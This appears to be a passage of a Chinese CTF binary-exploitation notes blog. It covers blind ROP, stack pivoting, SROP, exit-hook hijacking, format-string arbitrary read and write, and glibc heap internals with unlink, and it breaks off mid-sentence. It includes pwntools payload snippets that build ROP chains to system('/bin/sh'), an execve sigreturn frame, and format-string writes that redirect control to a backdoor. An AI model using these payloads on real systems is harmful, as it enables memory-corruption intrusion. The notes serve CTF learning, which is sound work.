excep","date":"2024-10-09","objectID":"/pwn_note/:13:5","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"BROP Blind ROP，无法获得二进制文件通过 ROP 远程攻击，用于开启 ASLR、NX、Canary 的 64 位程序 条件：栈溢出漏洞，进程崩溃立即重启且进程加载地址重启后不变 利用： 判断栈溢出长度，【泄露 canary、rbp、返回地址】 寻找 stop_gadget（可以返回 main 函数的 gadget） 寻找 BROP gadgets（__libc_csu_init中的 gadgets），定位pop rdi; ret地址 寻找 puts 或 write 函数 plt，用于泄露其他地址值 dump plt 表来泄露所需函数 got 地址 泄露出 got 地址，libc 执行系统命令 getshell # 泄露栈溢出长度 context.log_level='debug' for i in range(1000): try: p.sendline(b'a'*i) msg = p.recvline(timeout=1) p.interactive() except EOFError: p.close() ","date":"2024-10-09","objectID":"/pwn_note/:13:6","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"花式栈溢出 ① 无 main 函数 用 IDA 静态分析 main 的地址，在 gdb 中打该地址断点 ","date":"2024-10-09","objectID":"/pwn_note/:14:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"栈迁移 Stack Pivoting 溢出的距离短覆盖不到返回地址 距离短，覆盖了返回地址无法继续构造 ROP 链 需要二次 ROP “pop ebp ret” + “leave ret” 覆盖ebp为非法伪造的地址（堆或 bss 段），覆盖返回地址为pop ebp; ret或 leave; ret 的 gadget 地址 执行到leave，即 mov esp, ebp; pop ebp ，ebp 值给 esp，先esp和ebp同时指向覆盖后的 ebp 位置【vuln ebp】 接着【vuln ebp】地址pop给ebp，此时ebp指向恶意伪造地址且 esp+offset esp＋offset后指向返回地址-恶意代码地址，执行ret，恶意代码地址 pop 给 eip，此时执行 eip 处指令且栈已完成迁移 此时 eip 和 ebp 同时指向恶意代码地址，新栈中由 read 提前读入构建好 ROP 链，即可完成利用 漏洞点 return read(0, buf, 0x40uLL); // buf [rbp-0x30] // 实际read时是向rbp-0x30的位置写 原理示意 图中 ret 时 rsp 也应该移动 纯栈上栈迁移 32 位 buf 足够大 payload = [利用链].ljust(0x100, '\\x00') + p32(buf_addr - 4) + p32(leave_ret_addr) # 利用链 lian = puts@plt + main_addr + puts@got # 泄露libc lian = system_addr + main_addr + fake_ebp+12 + \"/bin/sh\\x00\" 64 位 有system函数plt，有rop链，得到ebp栈地址，无/bin/sh字符串，需自行输入 将栈上 rbp 覆盖为 fake_rbp-0x8，因为 leave 中 mov rsp, rbp 后还有 pop rbp 使得 rsp 增加 bin_sh_addr = ebp_addr - 0x8 payload2 = 0x8*b'a' + p64(ret_addr) + \\\\ # ebp位置直接作为返回地址 p64(pop_rdi_addr) + p64(bin_sh_addr) + \\\\ p64(system_addr) + b'/bin/sh\\x00' + \\\\ p64(ebp_addr-0x30) + p64(leave_ret_addr) \\\\ buf 足够大（0x100），写入利用链 payload = [利用链].ljust(0x100, '\\x00') + p64(buf_addr - 8) + p64(leave_ret_addr) # 跳转到fake_rbp即buf_addr位置 栈空闲地址迁移 32 位 payload = 'a'*padding + p32(stack - 0x500 - 4) + \\ # ebp p32(read_addr) + p32(leave_ret) + \\ # 返回地址 + 预留返回地址 p32(0) + p32(stack - 0x500) + p32(0x100) # arg1-3 # 再写入rop链 64 位 调用 read 函数将 rop 写入空闲地址(stack-0x1000)处，执行 rop payload = 'a'*padding + p64(stack-0x1000-0x8) \\\\ # rbp -\u003e fake_rbp - 8 + pop_rdi + p64(0) \\\\ + pop_rsi + p64(stack - 0x1000) \\\\ + pop_rdx + p64(0x100) \\\\ + (libc.sym['read']) + leave_ret_addr # 再写入rop链 bss 段上栈迁移 64 位 pwndbg\u003e x/30ga 0x404000 # bss段: 0x404000-0x405000 0x404000: 0x0 0x0 0x404010: 0x0 0x0 0x404020 \u003cstdout@GLIBC_2.2.5\u003e: 0x7f74229e4760 \u003c_IO_2_1_stdout_\u003e 0x0 0x404030 \u003cstdin@GLIBC_2.2.5\u003e: 0x7f74229e3a80 \u003c_IO_2_1_stdin_\u003e 0x0 0x404040 \u003cstderr@GLIBC_2.2.5\u003e: 0x7f74229e4680 \u003c_IO_2_1_stderr_\u003e 0x0 0x404050: 0x0 0x0 bss段上使用偏移0x200后的地址作为伪造栈 read 函数后使得 rbp 进入bss段中，接着返回 read 函数前 bss_addr = 0x404200 payload1 = b'a'*padding + p64(bss_addr) + p64(main_addr) # 伪造rbp return address 由于 buf 大小 0x80，通过 read 向rbp-0x80=bss_addr-0x80读入 payload2 read 返回后的指令为leave;ret;使得 rbp 变为bss_addr-0x80，rsp 将leave_ret_addrpop 给 rip【ret 指令】 接着执行返回地址leave_ret_addr中的leave;ret;指令，将 rbp 变为bss_addr+0x600后将顺序执行 flat 中指令 payload2 = flat([ bss_addr + 0x600, pop_rdi_ret_addr, elf.got['puts'], elf.plt['puts'], main_addr]).ljust(0x80, b'\\x00') \\\\ + p64(bss_addr - 0x80) \\\\ # rbp + p64(leave_ret_addr) # return address io.recv() # 获取puts got表地址从而获取libc基址 通过 read 读入 payload3，ret2libc getshell payload3 = flat([ bss_addr, # 应该可以任意地址 pop_rdi_ret_addr, libc.search(b'/bin/sh').__next__(), pop_rdi_ret_addr + 1, libc.symbols['system'] ]).ljust(0x80, b'\\x00') + p64(bss + 0x600 - 0x80) + p64(leave_ret_addr) 相对地址型栈迁移 漏洞点 void vuln() { void (*func_ptr)(); read(0, \u0026func_ptr, sizeof(func_ptr)); // 输入gadget 地址 func_ptr(); // 调用函数, 相对rsp偏移一段距离执行buf } int main() { char buf[0x100]; read(0, buf, 0x100); // 可写入rop链 输入'aaaa' vuln(); } 32 位 若没有足够 gadget，可以 vuln 中继续读入 read 前 push 参数地址，跳过一些 push 此时栈上垃圾数据可作为 size 参数，极大，可读入更多内容，输入 gadget+rop 链利用，此时 buf 可以不管了 利用 call pop_addr 后调整 esp，当 ret 使 rip 指向 system 函数，参数为 binsh 地址 # vul中 payload = p32(pop_addr) + p32(system_addr) + b'aaaa' + p32(binsh_addr) 64 位 输入两段内容在 call 时查看’aaaa’ buf 相对 rsp 的偏移，可以通过pop reg; sub rsp, xxx; ret等 gadget 来改变 rsp 最后 buf 即 rop 链的开头 pop rdi 地址等在 rsp 顶，gadget 中 ret 使得 rip 指向 rsp 中内容 payload1 = rop chain # 读入buf payload2 = p64(pop_addr) # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; ","date":"2024-10-09","objectID":"/pwn_note/:14:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"SROP （Sigreturn Oriented Programming），主要为 64 位中利用，sigreturn 是一个系统调用，在 unix 系统发生 signal 时会被间接调用，用户层调用，地址保存在栈上，执行后出栈，用户进程上下文保存在栈上，且内核恢复上下文时不校验 Linux i386 下调用 sigreturn 的代码存放在 vdso 中 Linux x86_64 通过调用 15 号 syscall 调用 sigreturn 系统调用指令 # 中断：调用者特权级别检查+压栈+跳转 int 0x80 # 无特权级别检查+无压栈+执行快 sysenter # Ring3 进入 Ring0 sysexit # Ring0 返回 Ring3 Signal 机制 ① 中断或异常，内核向进程发送 signal，进程挂起进入内核 ② 内核为进程保存上下文，跳转到注册好的 signal handler 处理 signal 【signal frame入用户空间栈；包含寄存器值和 signal 信息】 【新返回地址入栈，指向**sigreturn**系统调用】 ③ signal handler 返回【调用sigreturn】 ④ 内核为进程恢复上下文，根据 signal frame恢复寄存器值和信息，恢复进程执行 signal frame 32 位 struct sigcontext { unsigned short gs, __gsh; unsigned short fs, __fsh; unsigned short es, __esh; unsigned short ds, __dsh; unsigned long edi; unsigned long esi; unsigned long ebp; unsigned long esp; unsigned long ebx; unsigned long edx; unsigned long ecx; unsigned long eax; unsigned long trapno; unsigned long err; unsigned long eip; unsigned short cs, __csh; unsigned long eflags; unsigned long esp_at_signal; unsigned short ss, __ssh; struct _fpstate * fpstate; unsigned long oldmask; unsigned long cr2; }; 64 位 // defined in /usr/include/sys/ucontext.h /* Userlevel context. */ typedef struct ucontext_t // 入栈的是ucontext_t { unsigned long int uc_flags; struct ucontext_t *uc_link; stack_t uc_stack; // the stack used by this context mcontext_t uc_mcontext; // the saved context sigset_t uc_sigmask; struct _libc_fpstate __fpregs_mem; } ucontext_t; // defined in /usr/include/bits/types/stack_t.h /* Structure describing a signal stack. */ typedef struct { void *ss_sp; size_t ss_size; int ss_flags; } stack_t; // difined in /usr/include/bits/sigcontext.h struct sigcontext { __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union { struct _fpstate * fpstate; __uint64_t __fpstate_word; }; __uint64_t __reserved1 [8]; }; 覆盖或伪造该结构使得将伪造数据恢复到寄存器中，即控制所有寄存器，rip 控制为 syscall 地址，控制 rax 利用syscall; ret; 可任意系统调用，且需要 64 位中rax=0xf触发SYS_rt_sigreturn系统调用，32 位中为0x77 使用pwntools构造 payload # 需已知 bin_sh_addr, syscall_addr, gadget: mov_rax_f_ret[设置rax为0xf再ret] signal_frame = SigreturnFrame() signal_frame.rax = 59 # execve signal_frame.rdi = bin_sh_addr signal_frame.rsi = 0 signal_frame.rdx = 0 signal_frame.rip = syscall_addr # 溢出 payload = b'a'*padding + p64(mov_rax_0xf_ret) + p64(syscall_addr) + flat(signal_frame) 由于 rsp 可控，还可利用进行栈迁移，连续多次 SROP ","date":"2024-10-09","objectID":"/pwn_note/:14:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Exit Hook /stdlib/exit.c中原函数 pwndbg 中u _dl_fini找到rtld_lock_default_unlock_recursive，劫持其地址为 one_gadget，退出时 call one_gadget 达到劫持效果 ","date":"2024-10-09","objectID":"/pwn_note/:14:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"格式化字符串 格式化字符串函数接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后参数 当格式化字符串数量多于变参数量，出现不可预知情况 printf(\"%#lx %#lx %#lx %#lx %#lx\", 1, 2, 3); // 会依次解析后面的寄存器中的内容 0x1 0x2 0x3 0x7f17717e6f10 0x7f177180c040 漏洞点： read(0, \u0026buf, 0x100uLL); // 标准输入读0x100(256)字节数据到buf printf((const char *)\u0026buf, \u0026buf); // buf内容以字符串格式打印到标准输出 char buf; memset(\u0026buf, 0, 0x50u) // 将buf的地址开始的0x50字节的内存区域都设置为0 read(0, \u0026buf, 0x50u); printf(\u0026buf); // buf可控，格式化字符串漏洞 _isoc99_scanf(\"%ms\", \u0026format); //读取一个字符串并动态分配内存 printf(format); 语法 基本格式 %[parameter][flags][field width][.precision][length]type parameter n$：获取格式化字符串中指定打印参数，显示第 n 个参数，32 位为栈上后第 n 个地址 flags #：表示输出时需添加前缀，如十六进制中的0x width设置后指定用来作为填充的内容 field width 输出的最小宽度 .precision 输出的最大长度，依赖于特定的格式化类型 length 指出浮点型或整型参数输出长度 hh：整型，输出char一个字节 h：整型，输出short一个双字节 l：整型，输出long一个 4 字节；浮点型，输出double一个 8 字节 ll：整型，输出long long一个 8 字节 L：浮点型，输出long double一个 16 字节 z：整型，输出size_t一个 8 字节(64 位) type d/i：有符号整数，十进制 u：无符号整数 x/X：16 进制无符号整数，x 用小写字母，X 用大写字母，指定精度则不足左侧补 0 a/A：16 进制 double 型格式输出栈中变量，当程序开了 FORTIFY 机制后，程序编译时所有 printf 函数被替换为__printf_chk 函数，使用%a 输出栈上方的数据 o：8 进制无符号整数，指定精度则不足左侧补 0 s：输出 null 结尾的字符串直到精度规定上限，所有字节，将栈中的值以地址进行解析，输出该值（作为指针）指向的字符串内容（存于数据段），若该值不能解析为地址则程序崩溃 c：将 int 参数转为 unsigned char 型输出，单个字符 p：void *型，输出对应变量值，printf(\"%p\",a)以地址格式打印 a 值，printf(\"%p\",\u0026a)打印 a 所在地址，【地址泄露】 n：不输出字符，但把前方已经成功输出的字符个数写入对应的整型参数所指变量中；%n以 4 字节输入，【任意地址写】 利用 劫持程序的控制流：关键变量、Got 表[存放延迟绑定之后 libc 的函数，在 libc 中的实际的虚拟地址]、返回地址、hook 函数、fini_array… 地址泄露如 PIE，libc，stack 等，后在栈上构造地址，利用%n（或%hn，%hhn）实现任意地址写 main 函数调用了 foo 函数，foo 函数存在格式化字符串漏洞 且在 IDA 中可得到需要泄露的目标栈地址与 ebp 间距离（此处的 ebp 为 main 函数的栈底） 可劫持 foo 函数栈帧中的 ebp（该 ebp 指向 prev ebp 即 main 函数的 ebp） 实际示例 printf(\"%300c%3$hn\\n\", 'A', 0, \u0026string_len); //arg1: %300c指定'A'参数输出宽度300 //arg2: %3$hn向参数列表第3个参数string_len地址写入2字节, 将string_len改为0x012c即300 32 位 printf(\"%08x.%08x.%08x\"); # 直接栈上找参数，打印出栈上父函数的内容 gdb 调试结果 64 位 %p输出顺序是：rdi, rsi, rdx, rcx, r8, r9, 栈rsp往rbp，rdi可能作为输入的参数，不打印 ","date":"2024-10-09","objectID":"/pwn_note/:15:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"任意地址读 测试 ① 不断调整%后的数，打印出 addr 的地址形式值，同时保证整个 payload 是 8 的倍数，接着修改 p 为 s 和 n 分别进行字符串输出或写入 payload = b\"abcdefghijk\" + b\"%22$p\" + p64(addr) payload = 'AAAAAAAABBB%10$s' + p64(0x404050) # 偏移10个输出0x404050地址中的值, s改为n就是写入4字节(0x0000000b) 泄露 got 表地址 # 终端上用于测试 printf(input) 找到输入字符AAAA的偏移 AAAA%p %p %p %p AAAA0xab 0xcd 0xef 0x41414141 # 此时偏移为4输出 payload = p32(got_addr) + b\"%4$s\" # 利用 %4 偏移四个输出以该got_addr地址解析的值 用户可构造格式化字符串，泄露 read 的 got 表地址 %n$p # 泄露栈中被视为第n+1个参数的值 %n$s # 泄露栈中被视为第n+1个参数对应地址的内容 addr%k$s\\x00 # 获取地址addr对应值(addr为第k个参数): addr输入后也在栈上或寄存器参数中可用k找到 # addr可能较短而使得printf解析被0截断，导致输出失败 [%k$s(padding)][(addr)] ","date":"2024-10-09","objectID":"/pwn_note/:15:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"任意地址写 32 位 # 覆盖大数字 # 将大数字拆分多份分别覆盖, 以hhn写入32位数为例 # [addr][addr+1][addr+2][addr+3][pad1]%k$hhn[pad2]%(k+1)$hhn[pad3]%(k+2)$hhn[pad4]%(k+3)$hhn payload = p32(addr) + b'a'*12 + b'$6%n' # 向addr中填入数字16 # 覆盖小数字 # aa%k$n[padding][addr] # aa%8 栈上占4字节, $naa 栈上占4字节, 所以addr为第 4+4 = 8个参数 payload = b'aa%8$naa' + p32(addr) # 向addr中填入数字2 64 位 # 覆盖大数字 防止0截断addr放后面 # [pad1]%k$hhn[pad2]%(k+1)$hhn[pad3]%(k+2)$hhn[pad4]%(k+3)$hhn[pad][addr][addr+1][addr+2][addr+3] # 11,12,13是需要调出来的偏移, +0x100是转换为正数 payload = '' payload += '%{}c%{}$hhn'.format(one_gadget \u003e\u003e 0 \u0026 0xFF, 11) payload += '%{}c%{}$hhn'.format(((one_gadget \u003e\u003e 8 \u0026 0xFF) - (one_gadget \u003e\u003e 0 \u0026 0xFF) + 0x100) \u0026 0xFF, 12) payload += '%{}c%{}$hhn'.format(((one_gadget \u003e\u003e 16 \u0026 0xFF) - (one_gadget \u003e\u003e 8 \u0026 0xFF) + 0x100) \u0026 0xFF, 13) payload = payload.ljust((len(payload) + 7) / 8 * 8) payload += p64(exit_hook) payload += p64(exit_hook + 1) payload += p64(exit_hook + 2) # 覆盖小数字 # aa%7$naa为8字节 payload = b'aa%7$naa' + p64(0xdeadbeef) # 向0xdeadbeef写入2 下图为向 read 的 got 表中写入 8 pwntools 工具 fmtstr_payload(offset, {address:data}, nubwritten=0, write_size='byte') # offset: 格式化字符串偏移:第几个参数 # numbwritten: printf已输出的字符个数 # write_size: 写入方式byte/short/int对应hhn/hn/n 全局变量 当存在比较时可判断该变量是否为全局变量(i)，一般在 bss 段，若是则可以直接获取其地址进行格式化字符串覆盖绕过比较 .bss:000000000040408C i dd ? ; DATA XREF: main:loc_401404↑r 3 字节拆分 可向栈上写入 got 表地址，目的：覆盖 puts 的 got 表为 system 注： libc 中两个函数之间最多差 3 字节，若只修改⼀次，只能改 4 字节，此时打印出的字符数可能上亿次，使得内存爆了，所以改两次，第一次改 1 字节，第二次改 2 字节 payload1 = p64(elf.got['puts']) + p64(elf.got['puts'] + 1) # 栈上payload 偏移17, 18 pad = f'%{system \u0026 0xff}c%17$hhn' pad += f'%{((system \u003e\u003e 8) \u0026 0xffff) - (system \u0026 0xff)}c%18$hn' # %c为叠加, 减去前面累计的值 一次改同链 2 次 printf 解析机制：其遇到第⼀个位置指定的格式化字符串%15$hn，就会把整个格式化字符串中所有位置指定字符⼀起解析 格式化字符串改同一条链子两次不能用 2 次%$，需要第一次改用%，第二次用%$ pay = '%c'*13 + f\"%{(ret_addr\u00260xffff) - 13}c%hn%{0x10000-(ret_addr\u00260xffff)}c\" # 15-\u003e47-\u003e9 # (13+2)使得%hn解析第15, %{0x10000-(ret_addr\u00260xffff)}c: 格式化字符串的 %hn 最多截断16位: 0xffff, 补充输出字符使累积总数达到 0x10000字节来重置字符计数 pay += f'%{backdoor \u0026 0xff}c%47$hhn' # 47-\u003e9-\u003ebackdoor # 也可pay += '%c'*8 + \"%47$hhn\" 只更改最后一个字节为8 ","date":"2024-10-09","objectID":"/pwn_note/:15:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"非栈上 fmt 栈上相对地址写 printf(buf)中，buf为全局变量或 malloc 在堆上导致不在栈上，不能直接在栈上布置要写入的地址，利用 rbp 链 # 链: ebp1 9 -\u003e ebp2 37 -\u003e 栈上地址A 每次改只改2字节 payload1 = \"%{}c%9$hn\".format((stack_addr + offset) \u0026 0xFFFF) # ebp1 -\u003e ebp2[change] \u003e 栈上地址B payload2 = \"%{}c%37$hn\".format(value) # ebp2 \u003e 栈上地址B[change] \u003e value # value 传入 target_address \u003e\u003e idx * 16 \u0026 0xFFFF 任意地址写 # 链: ebp1 -\u003e ebp2 -\u003e 栈上地址A -\u003e value # 2次栈上相对地址写将A指向目标地址: ebp1 -\u003e ebp2 -\u003e 栈上地址A -\u003e new_value_target_address # 通过栈上地址A格式化字符串向目标地址写:ebp1 -\u003e ebp2 -\u003e 栈上地址A -\u003e new_value_target_address -\u003e new_value 多次利用链 有多次利用机会，目标为覆盖返回地址 9 为后门地址 # 15 -\u003e 47 -\u003e xxx rbp 8 0x7fffffffdfe0 9 0x7fffffffdfe8 —▸ 0x4012ba (main+28) ◂— mov eax, 0 # 返回地址, 可选任意链中某个返回地址即可 ... 15 0x7fffffffe018 —▸ 0x7fffffffe118 —▸ 0x7fffffffe437 ◂— '/home/pwn' # 利用链 ... 47 0x7fffffffe118 —▸ 0x7fffffffe437 ◂— '/home/pwn' # pwndbg中 pwndbg\u003e fmtarg 0x7fffffffdfe0 The index of format argument : 9 (\"\\%8$p\") pwndbg\u003e fmtarg 0x7fffffffe018 The index of format argument : 16 (\"\\%15$p\") pwndbg\u003e fmtarg 0x7fffffffe118 The index of format argument : 48 (\"\\%47$p\") 利用过程：（本地环境和远程环境不一样时栈分布不一致，将导致可能本地打通远程打不通） payload1 = b'%8$p' # 泄露栈地址 stack = int(io.recv(12), 16) - 0x8, 此为返回地址9 payload2 = f'%{stack \u0026 0xffff}c%15$hn'.encode() # 15-\u003e47-\u003e? 更改为 15-\u003e47-\u003e9 payload3 = f'%{backdoor \u0026 0xffff}c%47$hn'.encode() # 47-\u003e9-\u003e(main+28) 更改为47-\u003e9-\u003e(backdoor) # f'%{func \u0026 0xffff}c%number$hn'将func地址作为数值(16位)由%c写入栈中第number个参数指向的地址中 当不能泄露栈地址时且开了 PIE，更改偏移覆盖返回地址为 backdoor 有 16 分之一的可能性爆破成功 while True: try: p = process() ... p.sendline(\"cat flag\") p.recvline_contains('flag', timeout=1) p.interactive() except KeyboardInterrupt: p.close() exit(0) except: p.close() ","date":"2024-10-09","objectID":"/pwn_note/:15:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"其他 __printf_chk 函数泄露数据 __printf_chk(1LL, v); // 可以通过 %p 泄露libc地址 ","date":"2024-10-09","objectID":"/pwn_note/:15:4","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"堆溢出漏洞 调试 gdb.attach(io. \"b _int_malloc\\nc\") ","date":"2024-10-09","objectID":"/pwn_note/:16:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"堆管理器 用户与 OS 之间作为动态内存管理的中间人，由 libc.so.6 链接库实现，封装了系统调用（申请内存的 brk 与 mmap ），存在于【shared library 即 mmap 段】 响应用户申请内存，向 OS 申请内存，内核会预先分配很大的连续内存给堆管理器，返回给用户程序，堆空间不足再次与 OS 交互 管理用户释放的内存，适时归还 OS，也可响应用户新申请内存请求 系统调用 内存管理函数的系统调用包括 (s)brk、mmap、munmap 函数等 __brk(sys_brk) ： 堆通过 brk 向 bss 段和 data 数据段扩展【主线程、子线程可用】 main arena 中通过 sbrk 扩展 heap 初始堆的起始地址 start_brk 及堆的当前末尾 brk 指向同一地址，不开 ASLR 指向 data/bss 段结尾，开 ASLR 指向 data/bss 结尾的随机偏移处 __mmap(sys_mmap_pgoff) ： 物理内存/磁盘映射到虚拟内存中，未进行新的申请，在 mmap 段直接映射获取【子线程可用】 thread arena 中通过 mmap 分配新 heap 创建独立的匿名映射段，目的是可以申请以 0 填充的内存，该内存仅被调用进程所使用 各种堆管理器 dlmalloc - General purpose allocator ptmalloc2 - glibc jemalloc - FreeBSD and Firefox tcmalloc - Google libumem - Solaris arena 内存分配区，每个线程都单独有一个 arena 实例管理堆内存区域，用于加速多线程，主分配区和子分配区形成一个环形链表，每个线程中都存在一个私有变量存放分配区指针，分配内存时，未上锁的分配区来分配内存，若全被占用则建立新分配区 操作系统 –\u003e 堆管理器 –\u003e 用户 物理内存 –\u003e arena –\u003e 可用内存 // glibc-2.23 struct malloc_state { // glibc-2.27: mutex_t mutex; __libc_lock_define (, mutex); // 多线程互斥锁，4字节，保证线程安全 int flags; // 标志位，是否有fastbin、内存是否连续，4字节 mfastbinptr fastbinsY[NFASTBINS]; /* 存放 fastbin chunk 的数组 80字节 10项 单向连接 */ mchunkptr top; /* 指向Top Chunk堆顶 */ mchunkptr last_remainder;// 上一个chunk分配出一个small chunk给用户后的剩余部分，随后放入unsorted bin中 mchunkptr bins[NBINS * 2 - 2]; /* 存放闲置chunk的数组，包含large/small/unsorted bin 双向链接 */ // #define NBINS 128 /* 记录 bin 是否为空的 位图，chunk被取出后若一个bin空了不立即置0，下一次遍历才重新置0*/ unsigned int binmap[BINMAPSIZE]; // 每一个bit表示对应bin是否存在空闲chunk，4个block管理，每个block 4个字节，共128位 struct malloc_state *next; /* 指向下一个arena的指针，进程内所有arena串成循环单向链表 */ struct malloc_state *next_free;// 指向下一个空闲arena的指针 INTERNAL_SIZE_T attached_threads; // 与该arena相关的线程数 INTERNAL_SIZE_T system_mem; // 记录当前arena在堆区中所分配的内存总大小 INTERNAL_SIZE_T max_system_mem; // 申请释放内存过程中system_mem的峰值 }; typedef struct malloc_state *mstate; main_arena定义在 libc malloc.c 中的静态malloc_state结构体实例 随 libc 文件一同加载到内存映射段，泄露 arena 地址可获得 libc 在内存中基地址 static struct malloc_state main_arena = { .mutex = _LIBC_LOCK_INITIALIZER, .next = \u0026main_arena, .attached_threads = 1 }; chunk 用户申请内存的基本单位，malloc 返回的指针指向一个 chunk 的数据区域 // chunk在glibc中的实现 struct malloc_chunk { INTERNAL_SIZE_T prev_size; // 前一个空闲chunk的大小，不空闲则存储物理相邻的前chunk的数据 INTERNAL_SIZE_T size; // 本chunk大小 /* size必须为2*SIZE_SZ(机器字长)整数倍，机器字长：32位4,64位8 假如最低的chunk单位为8字节，大小补齐必须为8的倍数，最低三位只能为0，将该三位作为控制位 */ struct malloc_chunk* fd; // chunk处于分配状态，fd字段开始是用户数据，chunk空闲时，添加到对应空闲管理链表中 struct malloc_chunk* bk; // fd指向下一个空闲chunk，bk指向上一个空闲chunk, 双向连接 // chunk空闲时，只用于large chunk，双向连接 struct malloc_chunk* fd_nextsize; // fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针 struct malloc_chunk* bk_nextsize; // bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针 }; 当其为 malloced chunk 时，用 prev size 和 size 2 个字段；若其前的 chunk 也为 malloced chunk 时，只用 size 1 个字段 当其为 fast bin 时，用到 prev_size, size, fd 3 个字段 当其为 small bin 或 unsorted bin 时，用到 prev_size, size, fd, bk 4 个字段 当其为 large bin 时，用到所有 6 个字段 amd64 下最小 chunk 为 32 字节(0x20)，malloc(0x10)导致申请了 0x20 的 chunk；x86 下最小 chunk 为 16 字节(0x10) prev size 0x8 size 0x8 0x8 ← malloc 返回指针 0x8 prev size 复用 当前面的 chunk 多申请了 0x8 则 prev size 可以用于存放数据，因为只有前 chunk 为 free chunk，prev size 才有意义 申请0xn8与0xn0是完全一致的，申请 0xn0 的堆后，实际堆大小为 0xn8 标志位（AMP） A（NON_MAIN_ARENA）：A=0 属于主线程/主分区，A=1 为非主分区分配，不属于主线程 M（IS_MAPPED）：M=1 表示使用 mmap 映射区域，M=0 为使用 heap 区域 P（PREV_INUSE）：P=0 表示 pre_chunk 空闲可合并，mchunk_prev_size 才有效，P=1 表示前一个 chunk 被分配，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1 malloced chunk 及 free chunk top chunk 本质上是 free chunk，向操作系统申请到的内存减去 malloc 用掉的那一部分后剩余的内存由 top chunk 管理，物理地址最高 其prev_inuse位始终为 1，否则其前面的 chunk 会合并到 top chunk， 当申请的最后一个堆块进行free时，将会直接并入top chunk，通常利用来隔开top chunk last remainder 用户 malloc 请求，ptmalloc2 分配 chunk 给用户时内存大小不一致，用户取走后剩余的那一部分 bin 管理 arena 中空闲 chunk 的结构，以数组形式存在，数组元素为相应大小的 chunk 链表的链表头，存在于 arena 的 malloc_state 中 small bins，large bins，unsorted bin 维护在 bins 数组中，共 127 项，每连续两个 chunk 指针维护一个 bin(fd 和 bk) small bins 中 chunk 大小[32~1008]，large bins 的每个 bin 中 chunk 大小在一个范围内 先找 fast bins 和 small bins，然后找 unsorted bin，仍找不到则触发 unsorted bin 遍历，合并分类，再去对应 small bins 和 large bins 找，仍找不到则在 top chunk 中划分一些 Unsorted bin 循环双向链表，FIFO，插入的时候插入到 uns","date":"2024-10-09","objectID":"/pwn_note/:16:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"漏洞点 Unlink 条件：有堆溢出或 off by null，且可以泄露出指针数组地址 free时和目前物理相邻的 free chunk 合并为新堆块，避免碎片化内存，将某一个空闲 chunk 从其所处的双向链表中脱链 释放堆时会判断当前 chunk 的相邻 chunk 是否为空闲状态，若是则会进行堆合并。合并时会将空闲 chunk 从 bin 中 unlink，并将合并后的 chunk 添加到 unsorted bin 中。堆合并分为向前合并和向后合并 漏洞点：堆溢出 *(\u0026RecordList + i) = malloc(v1); // v1 \u003c 0x81 Create函数 read(0, *(\u0026RecordList + v1), 0x100uLL); // change函数 溢出长度足够大，在已申请的堆中伪造一块已经释放过的堆，当 free 其前或后面的堆块时会触发 unlink，使得伪造的部分会指向一个我们指定的地方，允许我们修改 绕过 2.23 if(__builtin_expect(FD-\u003ebk != P || BK-\u003efd != P, 0)) 伪造 fake chunk，将指针数组作为 chunk 绕过 if (!in_smallbin_range(chunksize_nomask(P)) \u0026\u0026 __builtin_expect(P-\u003efd_nextsize != NULL, 0)) { if (__builtin_expect(P-\u003efd_nextsize-\u003ebk_nextsize != P, 0) || __builtin_expect(P-\u003ebk_nextsize-\u003efd_nextsize != P, 0)) 使 fake chunk 属于 small bin 范围绕过 为了使 chunk2 与 fake chunk 合并，chunk2 的 size 的 PREV_INUSE 位为 0，且 chunk2 大小不能在 fast bin 范围 2.27 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) 需要将伪造的 chunk 的 size 设置为与下一个 chunk 的 prev_size 位相等，2.27 也可以设 prev_size 和 size 为 0 原理 释放 chunk2 使得与 fake chunk 合并，最终使得目标 P1 指向 P1 - 0x18，即 P1 中内容为 P1-0x18 的地址，fake chunk 进入 unsorted bin 中 此时向 P1 中写数据，实际是向 P1 指向的指针数组的第一项内写数据，可以写入__free_hook地址，再向指针数组第一项内写数据即向__free_hook所在地址写数据，写入system函数地址，此时 free 一个写了/bin/sh内容的堆块可以 get shell 老版本利用：无对 chunk 的 size 检查和双向链表检查 free(Q)时 前向合并，前 chunk use，不合并 后向合并，后 chunk free，合并，对N进行unlink unlink 执行效果——64 位 FD=P-\u003efd = target addr - 0x18 BK=P-\u003ebk = expect value // 变式: = target addr - 0x10 FD-\u003ebk = BK，即 *((target addr - 0x18) + 0x18) = BK = expect value // 任意地址写 BK-\u003efd = FD，即 *(expect value 